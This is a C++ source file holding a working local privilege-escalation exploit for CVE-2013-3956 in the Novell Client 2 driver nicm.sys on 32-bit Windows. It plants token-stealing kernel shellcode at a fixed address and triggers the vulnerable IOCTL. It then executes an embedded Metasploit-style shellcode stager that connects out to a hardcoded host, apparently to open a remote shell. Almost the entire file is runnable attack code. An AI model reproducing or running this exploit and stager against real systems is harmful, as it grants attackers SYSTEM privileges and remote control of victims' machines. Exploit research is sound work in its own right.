// CVE-2013-3956.cpp : This file contains the 'main' function. Program execution begins and ends there.
/*
Novell Client 2 SP3 Privilege escalation exploit
Tested on Windows 7 and 8 (x86) / nicm.sys 3.1.11.0
Thanks to Master Ryujin :)

The first public information I have seen about this bug was from Nikita Tarakanov @NTarakanov (I am not sure weather there was anything else public)
Metasploit module working against Windows 7: http://www.exploit-db.com/exploits/26452/
*/

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <Psapi.h>

int main() {

	DWORD IoControlCode = 0x00143B6B;
	DWORD InputBuffer = 0x0d0d0000;
	DWORD InputBufferLength = 0x14;
	DWORD OutputBuffer = 0x0;
	DWORD OutputBufferLength = 0x0;
	DWORD lpBytesReturned;

	LPVOID allocate_shellcode;
	allocate_shellcode = VirtualAlloc((LPVOID*)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (allocate_shellcode == NULL) {
		printf("[!] Error while allocating rop_chain: %d\n", GetLastError());
		exit(1);
	}

	char token_steal[] = "\x52\x53\x33\xc0\x64\x8b\x80\x24\x01\x00\x00"
		"\x8b\x40\x50\x8b\xc8\x8b\x98\xf8\x00\x00\x00"
		"\x89\x1d\x00\x09\x02\x00\x8b\x80\xb8\x00\x00"
		"\x00\x81\xe8\xb8\x00\x00\x00\x81\xb8\xb4\x00"
		"\x00\x00\x04\x00\x00\x00\x75\xe8\x8b\x90\xf8"
		"\x00\x00\x00\x8b\xc1\x89\x90\xf8\x00\x00\x00"
		"\x5b\x5a\xc2\x08";

	char *shellcode;
	DWORD pointer_one = 0x0d0d0000;
	DWORD pointer_two = 0x0d0d0020;
	DWORD shellcode_size = 0x1000;
	shellcode = (char *)malloc(shellcode_size);
	memset(shellcode, 0x41, shellcode_size);
	memcpy(shellcode, &pointer_one, sizeof(DWORD));
	memcpy(shellcode + 0x0c, &pointer_two, sizeof(DWORD));
	memcpy(shellcode + 0x20, token_steal, sizeof(token_steal));

	BOOL WPMresult;
	SIZE_T written;
	WPMresult = WriteProcessMemory(GetCurrentProcess(), (LPVOID)InputBuffer, shellcode, shellcode_size, &written);
	if (WPMresult == 0)
	{
		printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
		exit(1);
	}

	HANDLE nicm;
	nicm = CreateFileA((LPCSTR)"\\\\.\\nicm", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (nicm == INVALID_HANDLE_VALUE) {
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		return 1;
	}

	BOOL triggerIOCTL;
	triggerIOCTL = DeviceIoControl(nicm, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);

	unsigned char msf_shellcode[] = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
		"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
		"\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
		"\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
		"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
		"\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
		"\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
		"\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
		"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
		"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
		"\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3");

	DWORD msf_shellcode_size = sizeof(msf_shellcode);
	LPVOID msf_shellcode_alloc;
	msf_shellcode_alloc = VirtualAlloc(NULL, msf_shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (msf_shellcode_alloc == NULL)
	{
		printf("[!] Failed while calling VirtualAllocEx: %d\n", GetLastError());
		return 1;
	}

	WPMresult = WriteProcessMemory(GetCurrentProcess(), msf_shellcode_alloc, msf_shellcode, msf_shellcode_size, &written);
	if (WPMresult == 0)
	{
		printf("[!] Failed while calling WriteProcessMemory: %d\n", GetLastError());
		return 1;
	}

	DWORD threadID;
	HANDLE rThread;
	rThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)msf_shellcode_alloc, NULL, 0, &threadID);
	if (rThread == NULL)
	{
		printf("[!] Failed while calling CreateRemoteThread: %d\n", GetLastError());
		return 1;

	}
	WaitForSingleObject(rThread, INFINITE);

	return 0;
}
